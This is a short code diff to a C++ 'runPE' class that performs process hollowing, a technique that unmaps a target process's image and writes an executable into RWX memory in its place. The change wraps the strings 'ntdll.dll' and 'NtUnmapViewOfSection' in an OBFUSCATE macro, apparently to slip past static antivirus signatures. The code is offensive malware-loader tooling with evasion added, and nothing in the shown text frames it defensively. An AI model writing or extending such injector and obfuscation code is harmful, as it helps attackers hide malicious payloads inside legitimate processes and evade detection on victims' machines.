@@ -1,6 +1,10 @@
 typedef LONG(WINAPI* NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
 
 class runPE {
+
+	std::string ntUmap = OBFUSCATE("NtUnmapViewOfSection");
+	std::string ntdll = OBFUSCATE("ntdll.dll");
+
 public:
 	bool run(LPSTR szFilePath, PVOID pFile)
 	{
@@ -32,7 +36,7 @@ public:
 						ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);
 						if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
 						{
-							xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
+							xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA(ntdll.c_str()), ntUmap.c_str()));
 							xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
 						}
 						pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
